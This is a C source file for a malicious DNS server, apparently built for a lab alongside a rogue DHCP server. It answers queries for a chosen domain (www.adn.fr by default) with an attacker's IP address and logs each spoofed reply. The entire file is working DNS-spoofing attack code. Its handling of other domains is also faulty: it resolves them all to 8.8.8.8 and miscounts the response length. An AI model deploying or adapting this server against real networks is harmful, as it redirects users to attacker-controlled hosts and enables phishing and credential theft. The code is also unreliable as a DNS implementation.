#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <ctype.h>

#define MAX_DNS_SIZE 512
#define DNS_PORT 53

// Use the same IP as your DHCP server
#define MYIP "172.20.10.2"  // Same as in dhcp.h

// DNS header structure
typedef struct __attribute__((packed)) {
    uint16_t id;       // identification number
    uint16_t flags;    // various flags
    uint16_t qdcount;  // number of question entries
    uint16_t ancount;  // number of answer entries
    uint16_t nscount;  // number of authority entries
    uint16_t arcount;  // number of resource entries
} dns_header;

// Target domain to redirect
char *target_domain = "www.adn.fr";
char *attacker_ip = MYIP;  // Use the same IP as DHCP server

// Function prototypes
void process_dns_query(int sockfd, uint8_t *buffer, int len, struct sockaddr_in *client);
char *extract_domain_name(uint8_t *buffer, int *offset);
void create_dns_response(uint8_t *request, int req_len, uint8_t *response, int *resp_len, char *domain);

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;
    uint8_t buffer[MAX_DNS_SIZE];
    int received;

    // Parse command-line arguments
    if (argc >= 2) {
        target_domain = argv[1];
    }
    
    if (argc >= 3) {
        attacker_ip = argv[2];
    } else {
        attacker_ip = MYIP;  // Default to DHCP server IP
    }

    printf("[+] Malicious DNS Server starting\n");
    printf("    Target Domain: %s\n", target_domain);
    printf("    Redirecting to: %s\n", attacker_ip);
    printf("    Listening on: %s:%d\n", MYIP, DNS_PORT);

    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Enable socket reuse
    int reuse_enable = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse_enable, sizeof(reuse_enable)) < 0) {
        perror("setsockopt SO_REUSEADDR failed");
        close(sockfd);
        return 1;
    }

    // Bind socket to DNS port on our IP
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(MYIP);  // Bind to our specific IP
    server_addr.sin_port = htons(DNS_PORT);

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Socket bind failed - trying INADDR_ANY");
        // Fallback to any address
        server_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Socket bind failed completely");
            close(sockfd);
            return 1;
        }
    }

    printf("[+] DNS server listening on port %d\n", DNS_PORT);
    printf("[+] Press Ctrl+C to stop\n");

    // Main loop
    while (1) {
        client_len = sizeof(client_addr);
        received = recvfrom(sockfd, buffer, MAX_DNS_SIZE, 0,
                          (struct sockaddr *)&client_addr, &client_len);
        
        if (received < 0) {
            perror("recvfrom failed");
            continue;
        }
        
        if (received < sizeof(dns_header)) {
            continue;  // Packet too small, ignore
        }
        
        // Process DNS query
        process_dns_query(sockfd, buffer, received, &client_addr);
    }

    close(sockfd);
    return 0;
}

/**
 * Process a DNS query
 */
void process_dns_query(int sockfd, uint8_t *buffer, int len, struct sockaddr_in *client) {
    dns_header *header = (dns_header *)buffer;
    
    // Check if it's a standard query (QR bit = 0)
    if ((ntohs(header->flags) & 0x8000) == 0) {
        int offset = sizeof(dns_header);
        char *domain = extract_domain_name(buffer, &offset);
        
        if (domain != NULL) {
            printf("[+] DNS query for '%s' from %s\n", 
                   domain, inet_ntoa(client->sin_addr));
            
            // Create DNS response
            uint8_t response[MAX_DNS_SIZE];
            int response_len;
            create_dns_response(buffer, len, response, &response_len, domain);
            
            // Send response back to client
            if (sendto(sockfd, response, response_len, 0, 
                      (struct sockaddr *)client, sizeof(struct sockaddr_in)) < 0) {
                perror("Failed to send DNS response");
            } else {
                printf("[+] Sent DNS response to %s\n", inet_ntoa(client->sin_addr));
            }
            
            free(domain);
        }
    }
}

/**
 * Extract domain name from DNS query
 */
char *extract_domain_name(uint8_t *buffer, int *offset) {
    char *domain = (char *)malloc(256);
    if (domain == NULL) {
        return NULL;
    }
    
    int domain_len = 0;
    int i = *offset;
    int jumped = 0;
    int max_jumps = 5;  // Prevent infinite loops
    
    while (buffer[i] != 0 && max_jumps > 0) {
        // Check for compression pointer
        if ((buffer[i] & 0xC0) == 0xC0) {
            if (!jumped) {
                *offset = i + 2;  // Save position after pointer
            }
            i = ((buffer[i] & 0x3F) << 8) | buffer[i + 1];
            jumped = 1;
            max_jumps--;
            continue;
        }
        
        int label_len = buffer[i++];
        
        // Sanity check
        if (label_len > 63 || label_len + domain_len > 250) {
            free(domain);
            return NULL;
        }
        
        // Copy label
        for (int j = 0; j < label_len && i < 512; j++) {
            if (domain_len < 255) {
                domain[domain_len++] = buffer[i++];
            }
        }
        
        // Add dot if not at end
        if (buffer[i] != 0 && domain_len < 255) {
            domain[domain_len++] = '.';
        }
    }
    
    domain[domain_len] = '\0';
    
    if (!jumped) {
        *offset = i + 1;
    }
    
    return domain;
}

/**
 * Create a DNS response
 */
void create_dns_response(uint8_t *request, int req_len, uint8_t *response, int *resp_len, char *domain) {
    // Copy original query
    memcpy(response, request, req_len);
    
    dns_header *resp_header = (dns_header *)response;
    
    // Set response flags: QR=1, AA=1, recursion available
    resp_header->flags = htons(0x8580);
    resp_header->ancount = htons(1);  // One answer
    
    int offset = req_len;
    
    // Convert domain to lowercase for comparison
    char domain_lower[256];
    strncpy(domain_lower, domain, 255);
    domain_lower[255] = '\0';
    for (int i = 0; domain_lower[i]; i++) {
        domain_lower[i] = tolower(domain_lower[i]);
    }
    
    char target_lower[256];
    strncpy(target_lower, target_domain, 255);
    target_lower[255] = '\0';
    for (int i = 0; target_lower[i]; i++) {
        target_lower[i] = tolower(target_lower[i]);
    }
    
    int is_target = (strcmp(domain_lower, target_lower) == 0);
    
    // Answer section
    // Name: pointer to query name (compression)
    response[offset++] = 0xC0;
    response[offset++] = 0x0C;
    
    // Type: A record
    response[offset++] = 0x00;
    response[offset++] = 0x01;
    
    // Class: IN
    response[offset++] = 0x00;
    response[offset++] = 0x01;
    
    // TTL: 300 seconds
    uint32_t ttl = htonl(300);
    memcpy(response + offset, &ttl, 4);
    offset += 4;
    
    // Data length: 4 bytes
    response[offset++] = 0x00;
    response[offset++] = 0x04;
    
    // IP address
    if (is_target) {
        printf("[*] SPOOFING %s -> %s\n", domain, attacker_ip);
        struct in_addr addr;
        inet_aton(attacker_ip, &addr);
        memcpy(response + offset, &addr.s_addr, 4);
    } else {
        printf("[+] Normal response for %s -> 8.8.8.8\n", domain);
        // Return Google DNS for other domains
        response[offset++] = 8;
        response[offset++] = 8;
        response[offset++] = 8;
        response[offset++] = 8;
    }
    
    *resp_len = offset + 4;
}